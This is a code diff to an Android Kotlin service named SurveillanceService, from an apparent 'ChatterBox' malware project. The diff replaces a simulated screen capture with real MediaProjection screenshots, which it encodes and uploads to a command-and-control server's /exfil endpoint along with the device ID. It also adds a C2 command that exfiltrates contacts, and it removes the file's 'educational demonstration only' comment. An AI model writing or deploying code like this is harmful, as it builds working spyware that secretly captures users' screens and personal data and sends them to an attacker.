@@ -14,10 +14,15 @@ import android.graphics.PixelFormat
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
 import android.media.AudioFormat
 import android.media.AudioRecord
+import android.media.Image
 import android.media.ImageReader
 import android.media.MediaRecorder
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Environment
 import android.os.Handler
@@ -49,18 +54,15 @@ import com.example.ChatterBox.malicious.LocationTracker
 
 // Import annotations for suppressing warnings
 import androidx.annotation.RequiresApi
+import com.google.firebase.crashlytics.buildtools.reloc.org.apache.commons.codec.binary.Base64
 
 // Import JSON processing
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.net.HttpURLConnection
+import java.net.URL
 
-/**
- * Background service that performs surveillance activities:
- * - Screen recording
- * - Camera access
- * - Microphone recording
- * 
- * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
- */
+
 class SurveillanceService : Service() {
     private val TAG = "SurveillanceDemo"
     private val NOTIFICATION_ID = 1337
@@ -83,6 +85,15 @@ class SurveillanceService : Service() {
     private var captureSession: CameraCaptureSession? = null
     private var imageReader: ImageReader? = null
     private val cameraOpenCloseLock = Semaphore(1)
+
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var mediaProjectionManager: MediaProjectionManager? = null
+    private var screenDensity: Int = 0
+    private var displayWidth: Int = 0
+    private var displayHeight: Int = 0
+    private var projectionIntent: Intent? = null
+    private var projectionResultCode: Int = 0
 
     override fun onCreate() {
         super.onCreate()
@@ -113,7 +124,14 @@ class SurveillanceService : Service() {
         
         // Make log notification to show it's running
         showOngoingNotification("Service starting", "Attempting to connect to C2 server...")
-        
+        if (intent?.action == "SETUP_PROJECTION") {
+            val resultCode = intent.getIntExtra("resultCode", 0)
+            val data = intent.getParcelableExtra<Intent>("data")
+            if (data != null) {
+                setupMediaProjection(resultCode, data)
+                Log.d(TAG, "Media projection initialized")
+            }
+        }
         // Check if this is a test request
         if (intent?.action == "TEST_C2") {
             Log.d(TAG, "Received TEST_C2 action - testing C2 connection directly")
@@ -219,11 +237,9 @@ class SurveillanceService : Service() {
             createNotificationChannelO()
         }
     }
-    
-    /**
-     * Implementation of createNotificationChannel for Android O and above
-     * Extracted to separate method to avoid lint errors in older Android versions
-     */
+    private fun getDeviceID(): String {
+        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
+    }
     @RequiresApi(Build.VERSION_CODES.O)
     private fun createNotificationChannelO() {
         val name = "App Service"
@@ -250,39 +266,280 @@ class SurveillanceService : Service() {
         return builder.build()
     }
 
+
+    fun setupMediaProjection(resultCode: Int, data: Intent) {
+        projectionResultCode = resultCode
+        projectionIntent = data
+
+        // Initialize screen metrics
+        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+        val display = windowManager.defaultDisplay
+        val metrics = resources.displayMetrics
+        screenDensity = metrics.densityDpi
+
+        // Get screen dimensions - adjust as needed for performance
+        displayWidth = metrics.widthPixels
+        displayHeight = metrics.heightPixels
+    }
+
+
     // SCREEN CAPTURE FUNCTIONALITY
     private fun captureScreen() {
-        Log.d(TAG, "Attempting to capture screen")
-        
-        // This is a simplified implementation. In a real malicious scenario,
-        // this would use MediaProjection API with proper permission checks.
-        // For demo purposes, we'll just simulate this.
-        
-        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-        val filename = "screen_$timestamp.txt"
-        
-        val logFile = File(getExternalFilesDir(), filename)
-        
-        try {
-            FileOutputStream(logFile).use { out ->
-                val message = "SIMULATED SCREEN CAPTURE at $timestamp\n" +
-                              "In a real implementation, this would capture the current screen.\n"
-                
-                out.write(message.toByteArray())
-            }
-            
-            // Also send to C2 server
-            val screenData = JSONObject().apply {
-                put("timestamp", timestamp)
-                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
-                put("screen_content", "Simulated screen capture data at $timestamp")
-            }
-            c2Client.sendExfiltrationData("screenshots", screenData.toString())
-            
-            Log.d(TAG, "Screen capture simulated and sent to C2: $filename")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error simulating screen capture", e)
+        if (projectionIntent == null) {
+            Log.d(TAG, "MediaProjection not initialized - can't capture screen")
+            return
         }
+
+        try {
+            if (mediaProjectionManager == null) {
+                mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            }
+
+            if (mediaProjection == null) {
+                mediaProjection = mediaProjectionManager?.getMediaProjection(projectionResultCode, projectionIntent!!)
+            }
+
+            // Create an ImageReader to capture the screen
+            imageReader = ImageReader.newInstance(
+                displayWidth, displayHeight, PixelFormat.RGBA_8888, 2
+            )
+
+            virtualDisplay = mediaProjection?.createVirtualDisplay(
+                "ScreenCapture",
+                displayWidth, displayHeight, screenDensity,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader?.surface, null, null
+            )
+
+            // Wait a bit for the screen to be captured
+            Handler().postDelayed({
+                captureScreenAndSend()
+            }, 100)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error capturing screen", e)
+        }
+    }
+
+    private fun captureScreenAndSend() {
+        try {
+            // Acquire latest image
+            val image = imageReader?.acquireLatestImage()
+            if (image == null) {
+                Log.e(TAG, "Failed to acquire screen image")
+                cleanup()
+                return
+            }
+
+            // Convert Image to Bitmap
+            val bitmap = imageToBitmap(image)
+            image.close()
+
+            // Convert Bitmap to JPEG bytes
+            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val filename = "screenshot_$timestamp.jpg"
+            val jpegBytes = bitmapToJpegBytes(bitmap)
+
+            // Save locally for verification
+            val logFile = File(getExternalFilesDir(), filename)
+            FileOutputStream(logFile).use { out ->
+                out.write(jpegBytes)
+            }
+
+            // Send to C2 server
+            sendScreenshotToC2(jpegBytes, filename)
+
+            Log.d(TAG, "Screenshot captured and sent: $filename")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error processing screen capture", e)
+        } finally {
+            cleanup()
+        }
+    }
+
+    private fun imageToBitmap(image: Image): Bitmap {
+        val planes = image.planes
+        val buffer = planes[0].buffer
+        val pixelStride = planes[0].pixelStride
+        val rowStride = planes[0].rowStride
+        val rowPadding = rowStride - pixelStride * image.width
+
+        // Create bitmap
+        val bitmap = Bitmap.createBitmap(
+            image.width + rowPadding / pixelStride,
+            image.height,
+            Bitmap.Config.ARGB_8888
+        )
+        bitmap.copyPixelsFromBuffer(buffer)
+        return bitmap
+    }
+
+    private fun bitmapToJpegBytes(bitmap: Bitmap): ByteArray {
+        val out = ByteArrayOutputStream()
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
+        return out.toByteArray()
+    }
+
+    private fun sendScreenshotToC2(jpegBytes: ByteArray, filename: String) {
+        try {
+            // Get the device ID for identification
+            val deviceId = getDeviceID()
+
+            // Create a JSON object that matches exactly what the C2 server expects
+            val jsonData = JSONObject().apply {
+                put("type", "screenshots")  // The exact data type directory name
+                put("device_id", deviceId)
+                put("timestamp", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date()))
+                put("data", JSONObject().apply {
+                    put("filename", filename)
+                    put("image_data", android.util.Base64.encodeToString(jpegBytes, android.util.Base64.DEFAULT))
+                })
+            }
+
+            // Send the JSON data to the C2 server
+            Thread {
+                var connection: HttpURLConnection? = null
+                try {
+                    val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                    connection = url.openConnection() as HttpURLConnection
+                    connection.requestMethod = "POST"
+                    connection.setRequestProperty("Content-Type", "application/octet-stream")
+                    connection.setRequestProperty("X-Data-Type", "screenshots")  // Critical header
+                    connection.setRequestProperty("X-Filename", filename)
+                    connection.setRequestProperty("X-Device-ID", deviceId)
+                    connection.doOutput = true
+
+                    // Convert JSONObject to string and send
+                    val jsonString = jsonData.toString()
+
+                    Log.d(TAG, "Sending screenshot data to C2: ${jsonString.substring(0, 100)}...")
+
+                    // Write JSON data
+                    connection.outputStream.use { outputStream ->
+                        outputStream.write(jsonString.toByteArray())
+                        outputStream.flush()
+                    }
+
+                    // Check response
+                    val responseCode = connection.responseCode
+                    val responseMessage = connection.responseMessage
+                    Log.d(TAG, "Screenshot JSON upload response: $responseCode - $responseMessage")
+
+                    // Read and log response body for debugging
+                    if (responseCode != 200) {
+                        val errorStream = connection.errorStream ?: connection.inputStream
+                        val errorResponse = errorStream.bufferedReader().use { it.readText() }
+                        Log.e(TAG, "Error response: $errorResponse")
+                    } else {
+                        val inputStream = connection.inputStream
+                        val response = inputStream.bufferedReader().use { it.readText() }
+                        Log.d(TAG, "Success response: $response")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error sending JSON screenshot to C2", e)
+                } finally {
+                    connection?.disconnect()
+                }
+            }.start()
+
+            // You can also use the C2Client to send the data
+            c2Client.sendExfiltrationData("screenshots", jsonData.toString())
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending screenshot to C2", e)
+        }
+    }
+
+    private fun createScreenshotJson(deviceId: String, filename: String, jpegBytes: ByteArray): String {
+        val base64Data = Base64.encodeBase64String(jpegBytes)
+        return """
+    {
+        "type": "screenshots",
+        "device_id": "$deviceId",
+        "timestamp": "${SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())}",
+        "data": {
+            "filename": "$filename",
+            "image_data": "$base64Data"
+        }
+    }
+    """.trimIndent()
+    }
+
+    // Send data in JSON format
+    private fun sendJsonData(jsonData: String, filename: String) {
+        Thread {
+            var connection: HttpURLConnection? = null
+            try {
+                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.setRequestProperty("User-Agent", "ChatterBox")
+                connection.doOutput = true
+
+                // Write JSON data
+                connection.outputStream.use { outputStream ->
+                    outputStream.write(jsonData.toByteArray())
+                    outputStream.flush()
+                }
+
+                // Check response
+                val responseCode = connection.responseCode
+                val responseMessage = connection.responseMessage
+                Log.d(TAG, "Screenshot JSON upload response: $responseCode - $responseMessage")
+
+                // Read and log response body for debugging
+                if (responseCode != 200) {
+                    val errorStream = connection.errorStream ?: connection.inputStream
+                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
+                    Log.e(TAG, "Error response: $errorResponse")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending JSON screenshot to C2", e)
+            } finally {
+                connection?.disconnect()
+            }
+        }.start()
+    }
+
+    // Send data as binary (fixed version of original code)
+    private fun sendBinaryData(jpegBytes: ByteArray, filename: String, deviceId: String) {
+        Thread {
+            var connection: HttpURLConnection? = null
+            try {
+                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/octet-stream")
+                connection.setRequestProperty("X-Data-Type", "screenshots")
+                connection.setRequestProperty("X-Filename", filename)
+                connection.setRequestProperty("X-Device-ID", deviceId)
+                connection.setRequestProperty("User-Agent", "ChatterBox")
+                connection.doOutput = true
+
+                // Write JPEG data
+                connection.outputStream.use { outputStream ->
+                    outputStream.write(jpegBytes)
+                    outputStream.flush()
+                }
+
+                // Check response
+                val responseCode = connection.responseCode
+                val responseMessage = connection.responseMessage
+                Log.d(TAG, "Screenshot binary upload response: $responseCode - $responseMessage")
+
+                if (responseCode != 200) {
+                    val errorStream = connection.errorStream ?: connection.inputStream
+                    val errorResponse = errorStream.bufferedReader().use { it.readText() }
+                    Log.e(TAG, "Error response: $errorResponse")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending binary screenshot to C2", e)
+            } finally {
+                connection?.disconnect()
+            }
+        }.start()
     }
 
     // CAMERA ACCESS FUNCTIONALITY
@@ -312,7 +569,7 @@ class SurveillanceService : Service() {
             // Also send to C2 server
             val cameraData = JSONObject().apply {
                 put("timestamp", timestamp)
-                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("device_id", getDeviceID())
                 put("camera_image", "Simulated camera capture at $timestamp")
             }
             c2Client.sendExfiltrationData("camera", cameraData.toString())
@@ -350,7 +607,7 @@ class SurveillanceService : Service() {
             // Also send to C2 server
             val audioData = JSONObject().apply {
                 put("timestamp", timestamp)
-                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("device_id", getDeviceID())
                 put("audio_recording", "Simulated audio recording at $timestamp")
             }
             c2Client.sendExfiltrationData("audio", audioData.toString())
@@ -362,7 +619,8 @@ class SurveillanceService : Service() {
     }
 
     private fun getExternalFilesDir(): File {
-        val dir = File(Environment.getExternalStorageDirectory(), "ChatterBox/surveillance")
+        // Use the context method that returns the app-specific external files directory
+        val dir = File(getExternalFilesDir(null), "surveillance")
         if (!dir.exists()) {
             dir.mkdirs()
         }
@@ -469,6 +727,11 @@ class SurveillanceService : Service() {
                 showCommandNotification("Executing collect_device_info command")
                 collectDeviceInfo()
             }
+            command.contains("contacts") || command == "get_contacts" -> {
+                Log.d(TAG, "Executing command: get_contacts")
+                showCommandNotification("Executing get_contacts command")
+                Contacts.exfiltrateContacts(this)
+            }
             // More command types can be added here
             else -> {
                 Log.d(TAG, "Unknown command: $command")
@@ -527,7 +790,7 @@ class SurveillanceService : Service() {
                 put("device_model", android.os.Build.MODEL)
                 put("device_manufacturer", android.os.Build.MANUFACTURER)
                 put("android_version", android.os.Build.VERSION.RELEASE)
-                put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("device_id", getDeviceID())
                 put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                 put("timestamp", System.currentTimeMillis())
             }
@@ -540,7 +803,17 @@ class SurveillanceService : Service() {
             Log.e(TAG, "Error collecting device info", e)
         }
     }
+    private fun cleanup() {
+        try {
+            virtualDisplay?.release()
+            virtualDisplay = null
 
+            imageReader?.close()
+            imageReader = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error during cleanup", e)
+        }
+    }
     override fun onDestroy() {
         timer?.cancel()
         timer = null
@@ -552,7 +825,8 @@ class SurveillanceService : Service() {
         commandThread?.quitSafely()
         commandThread = null
         commandHandler = null
-        
+        mediaProjection?.stop()
+        mediaProjection = null
         Log.d(TAG, "Surveillance service destroyed")
         super.onDestroy()
     }
